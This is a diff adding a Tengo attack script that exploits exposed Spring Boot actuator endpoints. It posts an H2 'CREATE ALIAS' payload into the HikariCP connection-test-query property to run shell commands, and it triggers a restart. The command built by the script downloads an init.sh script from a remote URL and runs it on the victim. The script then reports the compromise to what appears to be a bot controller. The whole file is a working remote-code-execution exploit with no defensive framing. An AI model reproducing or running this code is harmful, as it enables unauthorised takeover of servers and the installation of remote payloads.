@@ -1,0 +1,130 @@
+/*
+* This spring_boot_rce_hikaricp.tengo is an attack script that attacks target host by spring boot hikaricp bugs
+*
+*
+*global variable:
+*attackTarget
+*attackScript
+*/
+
+fmt  := import("fmt")
+http := import("http")
+text := import("text")
+attack := import("attack")
+
+AttackName := "SpringBoot_RCE_Hikaricp"
+AttackType := "SpringBoot_RCE_Hikaricp"
+AttackInitScriptName := "init.sh"
+
+UA := "GoClient"
+timeoutMS := 10000
+
+host := attackTarget.ip
+port := attackTarget.port
+proto := attackTarget.proto
+
+isSSL := (proto == "https" ||port==443)
+
+
+client := http.newHttpClient(host,port,isSSL,timeoutMS)
+
+//make attack process and publish into attack tasks and send into sbot
+sendAttackResult := func() {
+
+    attackProcess := attack.newAttackProcess()
+    attackProcess.setIP(host)
+    attackProcess.setHost(host)
+    attackProcess.setPort(port)
+    attackProcess.setProto(isSSL?"https":"http")
+    attackProcess.setApp("SpringBoot")
+    attackProcess.setName(AttackName)
+    attackProcess.setType(AttackType)
+    attackProcess.setStatus(0)
+    attackProcess.setPayload("")
+    attackProcess.setResult("")
+    attackProcess.setDetails("")
+
+    //publish attack process into attack tasks
+    attackScript.pubProcess(attackProcess)
+}
+
+//make attack payload
+mkPayload := func() {
+
+    pfmt := `{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd.split(\",\")).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}'; CALL EXEC('%s');"}`
+
+    initUrl := attackScript.downloadInitUrl(host,port,AttackInitScriptName)
+    initDownloadCmd := attackScript.initCmdForLinux(initUrl,AttackType)
+    cmd := fmt.sprintf("bash,-c,%s",initDownloadCmd)
+
+    return fmt.sprintf(pfmt,cmd)
+}
+
+hasPath := func() {
+
+    url := "/actuator/env"
+    request := http.newHttpRequest("get",url).addHeader("User-Agent",UA)
+
+    response := client.send(request)
+
+    if response.getStatusCode() !=200 {
+           return false
+     }
+
+    content := response.getBodyAsString()
+
+     if content == "" {
+           return false
+     }
+
+     if !text.contains(content,"{") ||!text.contains(content,"propertySources") {
+
+           return false
+      }
+
+      return true
+}
+
+doAttack := func() {
+
+    payload := mkPayload()
+    url := "/actuator/env"
+    request := http.newHttpRequest("post",url).addHeader("User-Agent",UA)
+    request.addHeader("Content-Type","application/json")
+    request.putString(payload,false)
+    response := client.send(request)
+}
+
+doRestart := func() {
+
+    url := "/actuator/restart"
+    request := http.newHttpRequest("post",url).addHeader("User-Agent",UA)
+    response := client.send(request)
+
+    if response.getStatusCode() !=200 {
+               return false
+    }
+
+    content := response.getBodyAsString()
+
+    if content == "" {
+        return false
+    }
+
+    return text.contains(content,"{")&&text.contains(content,"message")
+}
+
+main := func(){
+
+    if hasPath(){
+
+        doAttack()
+
+        if doRestart(){
+            sendAttackResult()
+        }
+    }
+
+}
+
+main()
